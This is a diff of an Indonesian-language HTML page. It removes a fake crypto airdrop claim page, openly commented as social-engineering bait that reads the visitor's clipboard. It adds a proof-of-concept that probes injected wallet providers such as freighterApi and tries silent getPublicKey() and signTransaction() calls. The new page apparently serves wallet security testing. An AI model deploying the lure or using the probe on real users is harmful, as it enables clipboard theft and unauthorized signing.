@@ -3,33 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Reward & Airdrop - Verification</title>
+    <title>Unauthorized Provider Access PoC</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 90vh; margin: 0; }
-        .card { background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; }
-        h2 { color: #38bdf8; margin-bottom: 10px; font-size: 1.4rem; }
-        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 20px; }
-        .btn-claim { background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; border: none; padding: 14px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: opacity 0.2s; }
-        .btn-claim:active { opacity: 0.8; }
-        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 140px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.8rem; text-align: left; margin-top: 20px; font-family: monospace; }
-        .fake-box { margin-top: 15px; }
-        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 0.9rem; }
+        body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
+        button { background: #7c3aed; color: white; border: none; padding: 12px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 6px 0; width: 100%; text-align: left; }
+        button:hover { background: #6d28d9; }
+        .btn-danger { background: #dc2626; }
+        .btn-danger:hover { background: #b91c1c; }
+        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 6px; height: 220px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.85rem; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>🎉 Claim AQUA Airdrop</h2>
-        <p>Verifikasi alamat dompet Anda dengan menempelkan (Paste) data verifikasi untuk melanjutkan klaim.</p>
+        <h2>Uji Coba Unauthorized Provider API</h2>
+        <p>Menguji apakah fungsi dompet dapat dipanggil tanpa popup konfirmasi.</p>
         
-        <!-- Umpan Social Engineering: Tombol disamarkan sebagai tombol klaim hadiah -->
-        <button class="btn-claim" onclick="pancingClipboard()">KLIK UNTUK VERIFIKASI & KLAIM</button>
-        
-        <div class="fake-box">
-            <input type="text" id="targetInput" placeholder="Tekan tombol di atas untuk sinkronisasi..." readonly>
-        </div>
+        <button onclick="cekObjekProvider()">1. Cek Ketersediaan Objek Provider</button>
+        <button onclick="ujiGetPublicKey()">2. Uji Panggil getPublicKey() Tanpa Interaksi</button>
+        <button class="btn-danger" onclick="ujiSignTransaction()">3. Uji Panggil signTransaction() Diam-diam</button>
+    </div>
 
-        <div id="log">[INFO] Social engineering UI ready. Waiting for user interaction.</div>
+    <div class="card">
+        <h3>Live Execution Log:</h3>
+        <div id="log">[INFO] Provider test script loaded. Ready.</div>
     </div>
 
     <script>
@@ -40,27 +38,57 @@
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        async function pancingClipboard() {
-            log("[PROSES] Memicu fungsi pembacaan clipboard...");
+        // 1. Memeriksa objek global yang disuntikkan dompet
+        function cekObjekProvider() {
+            log("[PROSES] Memeriksa objek injeksi dompet di window...");
             
+            let detected = [];
+            if (typeof freighterApi !== 'undefined') detected.push('freighterApi');
+            if (typeof window.ethereum !== 'undefined') detected.push('window.ethereum');
+            if (typeof window.solana !== 'undefined') detected.push('window.solana');
+
+            if (detected.length > 0) {
+                log(`[BERHASIL] Objek dompet ditemukan: ${detected.join(', ')}`);
+                // Menampilkan properti yang tersedia di dalam freighterApi jika ada
+                if (typeof freighterApi !== 'undefined') {
+                    log("[INFO] Fungsi tersedia di freighterApi: " + Object.keys(freighterApi).join(', '));
+                }
+            } else {
+                log("[PERINGATAN] Tidak ada objek provider dompet standar yang terdeteksi di origin ini.");
+            }
+        }
+
+        // 2. Menguji pengambilan public key secara langsung
+        async function ujiGetPublicKey() {
+            log("[PROSES] Memanggil fungsi getPublicKey()...");
             try {
-                // Meminta akses clipboard yang akan memunculkan prompt/tombol paste dari sistem browser
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    document.getElementById('targetInput').value = text;
-                    log(`[BERHASIL] Data clipboard korban berhasil dicuri: ${text}`);
-                    alert("Airdrop Terverifikasi! Data tersinkron: " + text);
+                if (typeof freighterApi !== 'undefined' && freighterApi.getPublicKey) {
+                    const pubKey = await freighterApi.getPublicKey();
+                    log(`[KRITIS!] Berhasil mendapatkan Public Key tanpa popup konfirmasi: ${pubKey}`);
+                    alert("Akses Data Sensitif Berhasil: " + pubKey);
                 } else {
-                    log("[INFO] Menggunakan metode fallback input fokus...");
-                    const inputElem = document.getElementById('targetInput');
-                    inputElem.focus();
-                    document.execCommand('paste');
-                    if(inputElem.value) {
-                        log(`[BERHASIL] Silent paste via execCommand: ${inputElem.value}`);
-                    }
+                    log("[INFO] freighterApi.getPublicKey tidak tersedia atau memerlukan inisialisasi dApp.");
                 }
             } catch (err) {
-                log(`[GAGAL/DIBLOKIR] Pengguna menolak atau dibatasi browser: ${err.message}`);
+                log(`[TERPROTEKSI] Akses diblokir / memerlukan izin dompet: ${err.message}`);
+            }
+        }
+
+        // 3. Menguji penandatanganan transaksi secara otomatis
+        async function ujiSignTransaction() {
+            log("[PROSES] Menguji pemanggilan signTransaction()...");
+            try {
+                if (typeof freighterApi !== 'undefined' && freighterApi.signTransaction) {
+                    // Mengirim dummy payload transaksi untuk uji coba
+                    const dummyXdr = "AAAAAgAAAAD...[DUMMY_XDR_PAYLOAD]...";
+                    const signed = await freighterApi.signTransaction(dummyXdr);
+                    log(`[BAHAYA KRITIS!] Transaksi berhasil ditandatangani tanpa popup interaksi! Hasil: ${signed}`);
+                    alert("BERBAHAYA: Auto-signing transaksi berhasil dieksekusi!");
+                } else {
+                    log("[INFO] Fungsi signTransaction tidak ditemukan atau dibatasi oleh provider.");
+                }
+            } catch (err) {
+                log(`[TERPROTEKSI DENGAN BAIK] Eksekusi tertolak / memunculkan popup konfirmasi: ${err.message}`);
             }
         }
     </script>
